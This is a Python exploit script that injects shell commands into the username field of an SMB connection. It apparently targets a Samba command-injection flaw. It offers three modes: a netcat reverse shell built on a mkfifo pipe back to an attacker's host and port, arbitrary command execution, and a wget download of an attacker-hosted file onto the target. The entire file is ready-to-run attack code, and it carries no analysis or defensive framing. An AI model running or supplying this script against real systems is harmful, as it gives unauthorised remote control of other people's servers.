from smb.SMBConnection import *
import sys

options = ['shell', 'rce', 'upload']

class help:
    def opt_help():
        print('Usage: python3 exploit.py <option> <arguments>\n')
        print('Options:')
        print('shell\tStart a reverse shell')
        print('rce\tarbitrary file read and save to file')
        print('upload\tupload file to target from webserver')

    def shell_usage():
        print('python3 exploit.py shell <lhost> <lport> <rhost> <rport>')
        print('\nlhost\tLocal host IP')
        print('lport\tLocal host listening port')
        print('rhost\tRemote host IP')
        print('rport\tRemote host SMB port')

    def rce_usage():
        print('python3 exploit.py rce <command> <rhost> <rport>')
        print('\ncommand\tshell command to be executed, no output')
        print('rhost\tRemote host IP')
        print('rport\tRemote host SMB port')

    def upload_usage():
        print('python3 exploit.py upload <url> <target-location> <rhost> <rport>')
        print('\nurl\t\tlocation of target file (use public ip)')
        print('target-location\tTarget file on the target computer')
        print('rhost\t\tRemote host IP')
        print('rport\t\tRemote host SMB port')

class exploits:
    def shell():
        if len(sys.argv) != 6:
            help.shell_usage()
            exit(1)

        payload = '/=`nohup mkfifo /tmp/none; nc ' + sys.argv[2] + ' ' + sys.argv[3] + ' 0</tmp/none | /bin/sh >/tmp/none 2>&1; rm /tmp/none`'

        conn = SMBConnection(payload, "", "", "")
        try:
            print('[+]Sending payload')
            conn.connect(sys.argv[4], int(sys.argv[5]), timeout=1)
            print('[-]Exploit failed')
        except:
            print('[+]Sent successfully, check listener')
            exit(1)

    def rce():
        if len(sys.argv) != 5:
            help.rce_usage()
            exit(1)

        payload = '/=`nohup ' + sys.argv[2]  + '`'

        conn = SMBConnection(payload, "", "", "")
        try:
            print('[+]Sending payload')
            conn.connect(sys.argv[3], int(sys.argv[4]), timeout=1)
            print('[+]Exploit completed')
        except:
            print('[-]Exploit failed')
            exit(1)

    def upload():
        if len(sys.argv) != 6:
            help.upload_usage()
            exit(1)

        payload = '/=`nohup wget ' + sys.argv[2] + ' -O ' + sys.argv[3] + '`'

        conn = SMBConnection(payload, "", "", "")
        try:
            print('[+]Sending payload]')
            conn.connect(sys.argv[4], int(sys.argv[5]), timeout=1)
            print('[+]Exploit completed')
        except:
            print('[-]Exploit failed')
            exit(1)

def main():
    if len(sys.argv) == 1 or sys.argv[1] not in options:
        help.opt_help()
        exit(1)

    if sys.argv[1] == 'shell':
        exploits.shell()
    elif sys.argv[1] == 'rce':
        exploits.rce()
    elif sys.argv[1] == 'upload':
        exploits.upload()

main()
